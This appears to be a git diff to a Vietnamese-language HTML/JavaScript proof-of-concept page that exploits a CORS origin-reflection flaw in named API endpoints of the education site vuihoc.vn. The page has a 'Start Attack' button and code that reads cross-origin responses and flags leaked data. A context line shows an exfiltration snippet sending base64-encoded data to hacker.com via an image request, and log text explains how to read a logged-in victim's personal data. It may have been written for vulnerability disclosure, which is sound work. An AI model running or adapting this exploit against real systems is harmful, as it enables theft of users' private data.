@@ -56,11 +56,10 @@
 
     <div style="text-align: center;">
         <select id="endpointSelect">
-            <option value="https://api.vuihoc.vn/api/v1/users/me">api.vuihoc.vn /api/v1/users/me (CRITICAL - reflect origin)</option>
-            <option value="https://crm-api.vuihoc.vn/api/user/profile">crm-api.vuihoc.vn /api/user/profile (Unauthorized response)</option>
-            <option value="https://api.vuihoc.vn/api/v1/courses">api.vuihoc.vn /api/v1/courses (test endpoint)</option>
-            <option value="https://api.vuihoc.vn/api/v1/wallet">api.vuihoc.vn /api/v1/wallet (wallet endpoint)</option>
-            <option value="https://api.vuihoc.vn/api/v1/referrals">api.vuihoc.vn /api/v1/referrals (referral - chain với Lỗi 4)</option>
+            <option value="https://api.vuihoc.vn/v1/api/course/by/grade?gradeId=1&priority=1&SendFrom=WEB">⭐ api.vuihoc.vn /v1/api/course/by/grade (DATA THẬT - 10KB, không cần auth!)</option>
+            <option value="https://api.vuihoc.vn/api/v1/users/me">api.vuihoc.vn /api/v1/users/me (404 - endpoint không tồn tại)</option>
+            <option value="https://pas-api.vuihoc.vn/v1/me/classes?grade_id=1">pas-api /v1/me/classes (401 - cần token, nhưng CORS pass)</option>
+            <option value="https://crm-api.vuihoc.vn/api/user/profile">crm-api /api/user/profile (Unauthorized)</option>
         </select>
         <br>
         <button onclick="runExploit()">Bắt đầu Tấn Công</button>
@@ -181,6 +180,9 @@
                 log(`→ Content-Type: ${response.headers.get('Content-Type')}`, 'info');
 
                 // Đọc CORS headers
+                // QUAN TRỌNG: Khi CORS fail, browser CHE các CORS headers khỏi JavaScript
+                // → response.headers.get() trả null ngay cả khi server đã trả headers
+                // → Phải xem Network tab DevTools để biết response thật
                 const acao = response.headers.get('Access-Control-Allow-Origin');
                 const acac = response.headers.get('Access-Control-Allow-Credentials');
                 const acam = response.headers.get('Access-Control-Allow-Methods');
@@ -191,6 +193,22 @@
 
                 if (acam) log(`→ Access-Control-Allow-Methods: ${acam}`, 'info');
                 if (acah) log(`→ Access-Control-Allow-Headers: ${acah}`, 'info');
+
+                // Nếu JS không thấy ACAO → có thể browser đã block do CORS fail
+                // Hoặc có thể server không trả ACAO. Cần check Network tab để phân biệt.
+                if (!acao) {
+                    log("", 'info');
+                    log("[!] CẢNH BÁO: Browser không cho đọc CORS headers!", 'error');
+                    log("[!] Điều này có 2 nghĩa:", 'warn');
+                    log("    (a) CORS fail → browser block → server an toàn", 'info');
+                    log("    (b) CORS pass NHƯNG response bị browser che → không thấy được", 'info');
+                    log("", 'info');
+                    log("[*] CÁCH PHÂN BIỆT: Mở DevTools (F12) → Network tab", 'warn');
+                    log("    Click vào request → tab 'Response Headers'", 'info');
+                    log("    Nếu thấy 'Access-Control-Allow-Origin: https://hhuyer.github.io'", 'info');
+                    log("    → server VẪN dính lỗi CORS (case b)", 'success');
+                    log("    Nếu không thấy header này → server đã fix (case a)", 'error');
+                }
 
                 await sleep(500);
 
@@ -217,17 +235,29 @@
                     log("", 'info');
                     log(">>> PHÂN TÍCH:", 'warn');
 
+                    // Nếu là api.vuihoc.vn với endpoint thật - có data
+                    if (data.includes('"success":true') || data.includes('"data":[')) {
+                        log(">>> ĐÃ LẤY ĐƯỢC DATA THẬT CỦA VUIHOC!", 'critical');
+                        log(">>> Đây là danh sách khóa học / nội dung học của vuihoc", 'critical');
+                        log(">>> Hacker có thể đọc toàn bộ data này từ domain độc hại", 'critical');
+                        log("", 'info');
+                        log(">>> Endpoint này KHÔNG CẦN AUTH — server trả data cho bất kỳ ai!", 'error');
+                        log(">>> Kết hợp với CORS reflect → leak data công khai", 'error');
+                        log(">>> Nếu endpoint cần auth (vd /me/classes), hacker cần nạn nhân login", 'info');
+                        log(">>> Khi nạn nhân đã login + cookie SameSite=None → đọc được data PII", 'info');
+                    }
                     // Nếu là api.vuihoc.vn - response là 404 "API not found" do endpoint không tồn tại
-                    if (data.includes('API not found')) {
+                    else if (data.includes('API not found')) {
                         log("→ Endpoint này không tồn tại (404 từ app)", 'info');
                         log("→ NHƯNG CORS vẫn pass → nếu endpoint đúng, data sẽ bị đọc", 'warn');
-                        log("→ Hacker chỉ cần tìm endpoint thật (vd /api/v1/users/me có auth)", 'warn');
-                        log("→ Khi nạn nhân đã login, response sẽ chứa PII thay vì 404", 'warn');
+                        log("→ Đổi sang endpoint /v1/api/course/by/grade ở dropdown để xem data thật", 'warn');
                     }
-                    // Nếu là crm-api - "Unauthorized"
-                    else if (data.includes('Unauthorized')) {
-                        log("→ Endpoint tồn tại, trả về 'Unauthorized' vì chưa có token", 'info');
-                        log("→ Nếu nạn nhân đã login CRM và có token trong cookie, data sẽ bị đọc", 'warn');
+                    // Nếu endpoint cần token - "Token is invalid" hoặc "Unauthorized"
+                    else if (data.includes('Token is invalid') || data.includes('Unauthorized')) {
+                        log("→ Endpoint tồn tại, cần token auth", 'info');
+                        log("→ Nếu nạn nhân đã login và có token trong cookie, data sẽ bị đọc", 'warn');
+                        log("→ CORS vẫn pass → browser cho phép JS đọc response", 'warn');
+                        log("→ Chỉ cần nạn nhân login + cookie SameSite=None", 'warn');
                     }
                     // Nếu có data thật
                     else {
@@ -265,9 +295,10 @@ new Image().src = 'https://hacker.com/log?data=' + btoa(data);`;
                     }
 
                 } else if (!acao) {
-                    log(">>> Server không trả ACAO header", 'error');
-                    log(">>> Browser chặn cross-origin read", 'error');
-                    log(">>> CORS hoạt động đúng (an toàn)", 'success');
+                    log(">>> JS không đọc được ACAO header", 'error');
+                    log(">>> KIỂM TRA DevTools Network tab để biết thật:", 'warn');
+                    log(">>> Nếu Network tab có ACAO → CORS vẫn dính, chỉ là browser che", 'warn');
+                    log(">>> Nếu Network tab không có ACAO → server đã fix", 'success');
 
                 } else {
                     log(`>>> Server trả ACAO: ${acao} (không match hacker origin)`, 'warn');
